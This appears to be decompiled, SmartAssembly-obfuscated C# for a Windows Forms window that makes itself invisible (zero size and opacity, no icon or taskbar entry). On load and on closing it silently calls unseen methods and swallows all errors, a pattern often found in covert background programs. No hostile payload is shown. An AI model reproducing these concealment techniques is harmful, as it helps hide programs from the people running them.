using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ns3;
using ns6;

namespace ns1;

internal sealed class Form0 : Form
{
	private Class2 class2_0 = new Class2();

	private IContainer icontainer_0 = null;

	[NonSerialized]
	internal static GetString getString_0;

	public Form0()
	{
		method_0();
	}

	private void Form0_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			if (!Directory.Exists(Class11.smethod_2()))
			{
				Directory.CreateDirectory(Class11.smethod_2());
			}
			Thread.Sleep(105);
			class2_0.method_12();
			Thread.Sleep(90);
		}
		catch
		{
		}
	}

	private void Form0_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(101);
			class2_0.method_10();
			Thread.Sleep(88);
		}
		catch
		{
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(getString_0(107396679));
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(getString_0(107396679));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form0_FormClosing));
		((Form)this).add_Load((EventHandler)Form0_Load);
		((Control)this).ResumeLayout(false);
	}

	static Form0()
	{
		Strings.CreateGetStringDelegate(typeof(Form0));
	}
}
